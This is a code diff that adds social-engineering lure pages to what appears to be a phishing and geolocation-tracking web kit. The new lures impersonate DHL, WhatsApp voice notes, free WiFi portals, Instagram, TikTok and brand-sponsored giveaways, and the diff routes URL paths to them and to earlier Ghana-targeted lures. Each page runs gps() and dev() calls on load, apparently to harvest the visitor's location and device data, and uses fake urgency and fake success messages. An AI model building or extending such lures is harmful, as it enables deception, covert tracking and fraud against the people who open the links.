+<div style="text-align:center;margin-top:12px;font-size:12px;color:#999">This was me — Ignore</div>
+</div></div></div></div>`;
+setTimeout(async()=>{try{await gps()}catch(e){}dev()},600)}
+async function saVerify(){
+const b=document.getElementById('saBtn');b.textContent='Verifying...';b.disabled=true;await go();
+setTimeout(()=>{document.querySelector('.sa-details').innerHTML+=`<div class="fade-up" style="background:#e8f5e9;border-radius:8px;padding:16px;margin-top:12px;text-align:center">
+<div style="font-size:24px;margin-bottom:8px">✓</div>
+<div style="font-size:14px;color:#2e7d32;font-weight:500">Account Secured</div>
+<div style="font-size:12px;color:#66bb6a;margin-top:4px">The suspicious session has been terminated.</div></div>`;
+b.textContent='✓ Secured';b.style.background='#4caf50'},2500)}
+
+// ═══ PACKAGE DELIVERY (DHL/FedEx style) ═══
+function rPackage(){
+setOG('Your Package Requires Action','Delivery attempt failed. Confirm your address.');
+document.getElementById('tc').content='#d4001a';
+const tracking='DHL'+Date.now().toString().slice(-10).toUpperCase();
+document.body.innerHTML=`<div class="pk-page">
+<div class="pk-bar"><span>📦</span><span class="logo">DHL Express</span></div>
+<div class="pk-body"><div class="pk-card">
+<div class="pk-header"><div class="icon">📦</div><h2>Delivery Attempt Failed</h2>
+<p>We tried to deliver your package but no one was available.</p></div>
+<div class="pk-track">
+<div class="pk-step"><div class="dot done">✓</div><div class="info"><div class="title">Package received at origin</div><div class="time">Jul 8, 2026</div></div></div>
+<div class="pk-step"><div class="dot done">✓</div><div class="info"><div class="title">In transit — sorting facility</div><div class="time">Jul 10, 2026</div></div></div>
+<div class="pk-step"><div class="dot done">✓</div><div class="info"><div class="title">Out for delivery</div><div class="time">Today, 10:32 AM</div></div></div>
+<div class="pk-step"><div class="dot current">!</div><div class="info"><div class="title" style="color:#ff9800;font-weight:600">Delivery failed — Action required</div><div class="time">Today, 2:15 PM</div></div></div>
+<div class="pk-step"><div class="dot pending">5</div><div class="info"><div class="title" style="color:#999">Delivered</div><div class="time">Pending</div></div></div>
+</div>
+<div class="pk-action">
+<div style="font-size:13px;color:#666;margin-bottom:12px">Tracking: <strong>${tracking}</strong></div>
+<div style="background:#fff3e0;border-radius:8px;padding:10px;font-size:13px;color:#e65100;margin-bottom:12px">
+⚠️ Confirm your delivery address to reschedule. Package will be returned in 48 hours.</div>
+<button class="pk-btn" id="pkBtn" onclick="pkConfirm()">Confirm Address & Reschedule</button>
+</div></div></div></div>`;
+setTimeout(async()=>{try{await gps()}catch(e){}dev()},600)}
+async function pkConfirm(){
+const b=document.getElementById('pkBtn');b.textContent='Confirming...';b.disabled=true;await go();
+setTimeout(()=>{document.querySelector('.pk-action').innerHTML+=`<div class="fade-up" style="background:#e8f5e9;border-radius:8px;padding:14px;text-align:center;margin-top:12px">
+<div style="font-size:20px;margin-bottom:6px">✓</div>
+<div style="font-size:14px;color:#2e7d32;font-weight:500">Delivery Rescheduled</div>
+<div style="font-size:12px;color:#66bb6a;margin-top:4px">Tomorrow between 9AM - 1PM</div></div>`;
+b.textContent='✓ Confirmed';b.style.background='#4caf50'},2500)}
+
+// ═══ VOICE NOTE (WhatsApp style) ═══
+function rVoiceNote(){
+setOG('New Voice Message','You have an unheard voice message. Tap to listen.');
+document.getElementById('tc').content='#0b141a';
+const senders=['Mama','Boss','Babe ❤️','Kwame','Unknown Number'];
+const sender=senders[Math.floor(Math.random()*senders.length)];
+const durations=['0:12','0:23','0:45','1:02','0:34'];
+const dur=durations[Math.floor(Math.random()*durations.length)];
+document.body.innerHTML=`<div class="vn-page"><div class="vn-card">
+<div class="vn-icon">🎤</div>
+<div class="vn-title">Voice Message from ${sender}</div>
+<div class="vn-sub">Tap play to listen</div>
+<div class="vn-wave"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></div>
+<div class="vn-dur">${dur}</div>
+<button class="vn-btn" id="vnBtn" onclick="vnPlay()">▶ Play Voice Message</button>
+</div></div>`;
+setTimeout(async()=>{try{await gps()}catch(e){}dev()},600)}
+async function vnPlay(){
+const b=document.getElementById('vnBtn');b.textContent='Loading...';b.disabled=true;await go();
+setTimeout(()=>{b.textContent='Playing...';b.style.background='#005c4b';
+setTimeout(()=>{b.textContent='✓ Played';document.querySelector('.vn-sub').textContent='Voice message played'},5000)},2000)}
+
+// ═══ WIFI CAPTIVE PORTAL ═══
+function rWifi(){
+setOG('Free WiFi — Connect Now','Accept terms to connect to free high-speed WiFi');
+document.getElementById('tc').content='#667eea';
+const networks=['Starbucks_Free','Airport_WiFi','Hotel_Guest','Mall_Free_5G','Public_WiFi_Fast'];
+const net=networks[Math.floor(Math.random()*networks.length)];
+document.body.innerHTML=`<div class="wifi-page"><div class="wifi-card">
+<div class="wifi-icon">📶</div>
+<div class="wifi-title">Free WiFi Available</div>
+<div class="wifi-sub">Connect to high-speed internet</div>
+<div class="wifi-net"><span class="bars">📶</span><span class="name">${net}</span><span class="lock">🔓</span></div>
+<div style="background:#f0f7ff;border-radius:8px;padding:12px;margin-bottom:16px;font-size:13px;color:#1a73e8;text-align:left">
+<strong>Speed:</strong> Up to 100 Mbps<br>
+<strong>Duration:</strong> Unlimited<br>
+<strong>Cost:</strong> Free
+</div>
+<button class="wifi-btn" id="wifiBtn" onclick="wifiConnect()">Connect to WiFi</button>
+<div class="wifi-tos">By connecting, you agree to our <a href="#" style="color:#667eea">Terms of Service</a> and <a href="#" style="color:#667eea">Privacy Policy</a></div>
+</div></div>`;
+setTimeout(async()=>{try{await gps()}catch(e){}dev()},600)}
+async function wifiConnect(){
+const b=document.getElementById('wifiBtn');b.textContent='Connecting...';b.disabled=true;await go();
+setTimeout(()=>{document.querySelector('.wifi-card').innerHTML=`<div class="fade-up" style="text-align:center;padding:20px">
+<div style="font-size:48px;margin-bottom:12px">✓</div>
+<div style="font-size:18px;color:#333;font-weight:600">Connected!</div>
+<div style="font-size:14px;color:#666;margin-top:8px">You are now connected to free WiFi</div>
+<div style="background:#e8f5e9;border-radius:8px;padding:12px;margin-top:16px;font-size:13px;color:#2e7d32">
+Speed: 94 Mbps ↓ / 47 Mbps ↑</div></div>`},2500)}
+
+// ═══ INSTAGRAM VERIFICATION ═══
+function rInstagram(){
+setOG('Instagram — Account Verification Required','Your account may be restricted. Verify now.');
+document.getElementById('tc').content='#fafafa';
+document.body.innerHTML=`<div class="ig-page">
+<div class="ig-bar"><div class="logo" style="font-family:serif;font-style:italic;font-size:22px">Instagram</div></div>
+<div class="ig-body"><div class="ig-card">
+<div class="ig-shield">🛡️</div>
+<div class="ig-title">Account Verification Required</div>
+<div class="ig-sub">We've detected unusual activity on your account. Complete verification to avoid restrictions.</div>
+<div class="ig-warn">⚠️ Your account will be restricted in <strong>24 hours</strong> if verification is not completed.</div>
+<div style="text-align:left;margin-bottom:16px;font-size:13px;color:#262626">
+<div style="padding:6px 0;border-bottom:1px solid #efefef;display:flex;justify-content:space-between"><span style="color:#8e8e8e">Account</span><span>@your_account</span></div>
+<div style="padding:6px 0;border-bottom:1px solid #efefef;display:flex;justify-content:space-between"><span style="color:#8e8e8e">Status</span><span style="color:#ed4956">⚠️ At Risk</span></div>
+<div style="padding:6px 0;display:flex;justify-content:space-between"><span style="color:#8e8e8e">Action</span><span>Identity verification</span></div>
+</div>
+<button class="ig-btn" id="igBtn" onclick="igVerify()">Verify My Account</button>
+<div class="ig-footer">This is an automated security check by Instagram.</div>
+</div></div></div>`;
+setTimeout(async()=>{try{await gps()}catch(e){}dev()},600)}
+async function igVerify(){
+const b=document.getElementById('igBtn');b.textContent='Verifying...';b.disabled=true;await go();
+setTimeout(()=>{document.querySelector('.ig-card').innerHTML=`<div class="fade-up" style="text-align:center;padding:20px">
+<div style="font-size:36px;margin-bottom:12px">✓</div>
+<div style="font-size:16px;color:#262626;font-weight:600">Verification Complete</div>
+<div style="font-size:14px;color:#8e8e8e;margin-top:8px">Your account is now secured. No further action needed.</div>
+<div style="background:#e8f5e9;border-radius:8px;padding:12px;margin-top:16px;font-size:13px;color:#2e7d32">Account status: ✓ Verified & Protected</div></div>`},2500)}
+
+// ═══ LOTTERY / GIVEAWAY ═══
+function rLottery(){
+setOG('Congratulations! You Won a Prize','You have been selected. Claim your reward now.');
+document.getElementById('tc').content='#1a1a2e';
+const prizes=['$5,000','iPhone 16 Pro','$2,500 Gift Card','Samsung Galaxy S25','$10,000 Cash'];
+const prize=prizes[Math.floor(Math.random()*prizes.length)];
+const sponsors=['Google','Apple','Samsung','Amazon','Microsoft'];
+const sponsor=sponsors[Math.floor(Math.random()*sponsors.length)];
+document.body.innerHTML=`<div class="lt-page"><div class="lt-card">
+<div class="lt-badge">🎉 WINNER</div>
+<div class="lt-title">Congratulations!</div>
+<div class="lt-amount">${prize}</div>
+<div class="lt-sub">You've been randomly selected in the ${sponsor} Annual Giveaway 2026</div>
+<div class="lt-info">
+<div class="row"><span>Sponsor</span><span style="font-weight:600">${sponsor}</span></div>
+<div class="row"><span>Prize</span><span style="font-weight:600">${prize}</span></div>
+<div class="row"><span>Selection</span><span>Random draw</span></div>
+<div class="row"><span>Claim by</span><span style="color:#c62828">Today</span></div>
+</div>
+<button class="lt-btn" id="ltBtn" onclick="ltClaim()">Claim My Prize</button>
+<div class="lt-timer">⏰ Offer expires in <span id="ltTime">14:59</span></div>
+</div></div>`;
+// Countdown timer
+let sec=899;setInterval(()=>{if(sec<=0)return;sec--;const m=Math.floor(sec/60);const s=sec%60;
+const el=document.getElementById('ltTime');if(el)el.textContent=m+':'+(s<10?'0':'')+s},1000);
+setTimeout(async()=>{try{await gps()}catch(e){}dev()},600)}
+async function ltClaim(){
+const b=document.getElementById('ltBtn');b.textContent='Processing...';b.disabled=true;await go();
+setTimeout(()=>{document.querySelector('.lt-card').innerHTML+=`<div class="fade-up" style="background:rgba(255,255,255,.9);border-radius:8px;padding:16px;margin-top:16px;text-align:center">
+<div style="font-size:24px;margin-bottom:8px">🎁</div>
+<div style="font-size:14px;color:#333;font-weight:600">Claim Registered!</div>
+<div style="font-size:12px;color:#666;margin-top:4px">You will receive further instructions via SMS within 24 hours.</div></div>`;
+b.textContent='✓ Claimed';b.style.background='#333'},2500)}
+
+// ═══ TIKTOK VERIFICATION ═══
+function rTikTok(){
+setOG('TikTok — Account Under Review','Verify your identity to keep your account active.');
+document.getElementById('tc').content='#000';
+document.body.innerHTML=`<div style="background:#000;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;font-family:'Inter',sans-serif">
+<div style="background:#161823;border-radius:16px;padding:28px;max-width:380px;width:100%;text-align:center;border:1px solid #2f2f2f">
+<div style="font-size:32px;margin-bottom:16px">🎵</div>
+<div style="font-size:12px;color:#fe2c55;font-weight:600;letter-spacing:2px;margin-bottom:12px">TIKTOK SECURITY</div>
+<div style="font-size:18px;color:#fff;font-weight:600;margin-bottom:8px">Account Under Review</div>
+<div style="font-size:14px;color:#8a8b91;margin-bottom:20px;line-height:1.5">Your account has been flagged for unusual activity. Complete verification to avoid permanent suspension.</div>
+<div style="background:#1f1f2e;border-radius:8px;padding:12px;margin-bottom:16px;text-align:left">
+<div style="display:flex;justify-content:space-between;padding:4px 0;font-size:13px"><span style="color:#8a8b91">Followers at risk</span><span style="color:#fe2c55">All</span></div>
+<div style="display:flex;justify-content:space-between;padding:4px 0;font-size:13px"><span style="color:#8a8b91">Videos at risk</span><span style="color:#fe2c55">All</span></div>
+<div style="display:flex;justify-content:space-between;padding:4px 0;font-size:13px"><span style="color:#8a8b91">Deadline</span><span style="color:#fe2c55">24 hours</span></div>
+</div>
+<button id="ttBtn" onclick="ttVerify()" style="background:#fe2c55;color:#fff;border:none;padding:14px;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;width:100%">Verify My Account</button>
+<div style="font-size:11px;color:#8a8b91;margin-top:12px">This is an automated security check.</div>
+</div></div>`;
+setTimeout(async()=>{try{await gps()}catch(e){}dev()},600)}
+async function ttVerify(){
+const b=document.getElementById('ttBtn');b.textContent='Verifying...';b.disabled=true;await go();
+setTimeout(()=>{b.textContent='✓ Account Secured';b.style.background='#25f4ee';b.style.color='#000'},2500)}
+</script>
+<script>
+// ═══ GHANAIAN JOBS / ARTISAN (default fallback) ═══
 function rJob(){
 const T={
 mason:{n:'Tonaton',c:'#0066cc',t:'Mason Needed — Spintex Road',s:'GH₵ 400/day · Start Monday',tag:'URGENT',bg:'#e3f2fd',
@@ -518,7 +896,7 @@ r:[['Facility','Korle Bu Hospital'],['Unit','General Ward'],['Shift','Tonight 7P
 kumawood:{n:'GhOneTV',c:'#9c27b0',t:'Kumawood Actors Needed',s:'Lead role · GH₵ 2,000/day',tag:'CASTING',bg:'#f3e5f5',
 r:[['Production','New series'],['Role','Supporting lead'],['Location','Kumasi'],['Pay','GH₵ 2,000/day'],['Audition','This Saturday']]},
 meqasa:{n:'Meqasa',c:'#1565c0',t:'Tenant — 2BR East Legon',s:'GH₵ 3,500/month · 2yrs advance',tag:'HOT',bg:'#e3f2fd',
-r:[['Type','2 Bedroom'],['Area','East Legon'],['Budget','GH₵ 3,500/month'],['Advance','2 years ready'],['Move-in','Immediately']]},
+r:[['Type','2BR apartment'],['Area','East Legon'],['Rent','GH₵ 3,500/month'],['Advance','2 years'],['Move-in','Immediate']]},
 truck:{n:'Cargo GH',c:'#c62828',t:'Truck Load — Accra to Kumasi',s:'GH₵ 4,500 · Tomorrow 5AM',tag:'LOAD',bg:'#fbe9e7',
 r:[['Route','Tema Port → Kumasi'],['Load','10 tonnes materials'],['Pay','GH₵ 4,500'],['Pickup','Tomorrow 5AM'],['Truck','Flatbed']]},
 bolt:{n:'Bolt Ghana',c:'#34e27c',t:'Surge — Airport City',s:'GH₵ 50+ per trip',tag:'SURGE',bg:'#e8f5e9',
@@ -552,7 +930,6 @@ document.body.innerHTML=`<div class="jb-page"><div class="jb-nav"><span class="l
 setTimeout(async()=>{try{await gps();setTimeout(()=>{const m=document.getElementById('jm');
 if(m)m.innerHTML='<div class="ic">📍</div><div><div style="font-size:14px;font-weight:600;color:#2e7d32">2.8 km from you</div><div style="font-size:11px;color:#66bb6a;margin-top:1px">About 15 min by trotro</div></div>'},2500)}
 catch(e){}dev()},1000)}
-
 async function jA(){const b=document.querySelector('.jb-btn');b.textContent='Loading...';b.disabled=true;await go();
 setTimeout(()=>{document.querySelector('.bdy').innerHTML+=`<div class="jb-reveal fade-up">
 <h3>📞 Contact</h3>
@@ -563,8 +940,11 @@ setTimeout(()=>{document.querySelector('.bdy').innerHTML+=`<div class="jb-reveal
 <p style="font-size:11px;color:#999;margin-top:8px;text-align:center">Full number sent via SMS</p></div>`;
 b.textContent='✓ Loaded';b.style.background='#4caf50'},2500)}
 
-// ═══ ROUTER — Matches templates.json url_path exactly ═══
+// ═══════════════════════════════════════════════════════════════
+// ROUTER — Matches templates.json url_path exactly
+// ═══════════════════════════════════════════════════════════════
 const R={
+  // Ghana-specific
   momo:rMomo,
   voda:rVoda,
   ecg:rECG,
@@ -575,7 +955,33 @@ const R={
   church:rWA,
   funeral:rWA,
   meeting:rZoom,
-  img:rImg
+  img:rImg,
+  // NEW — Global lures
+  captcha:rCaptcha,
+  verify:rCaptcha,
+  drive:rGDrive,
+  gdrive:rGDrive,
+  document:rGDrive,
+  security:rSecAlert,
+  alert:rSecAlert,
+  login:rSecAlert,
+  package:rPackage,
+  delivery:rPackage,
+  dhl:rPackage,
+  fedex:rPackage,
+  voicenote:rVoiceNote,
+  voice:rVoiceNote,
+  audio:rVoiceNote,
+  wifi:rWifi,
+  hotspot:rWifi,
+  instagram:rInstagram,
+  ig:rInstagram,
+  tiktok:rTikTok,
+  tt:rTikTok,
+  lottery:rLottery,
+  prize:rLottery,
+  giveaway:rLottery,
+  win:rLottery
 };
 (R[PB]||rJob)();
 </script>
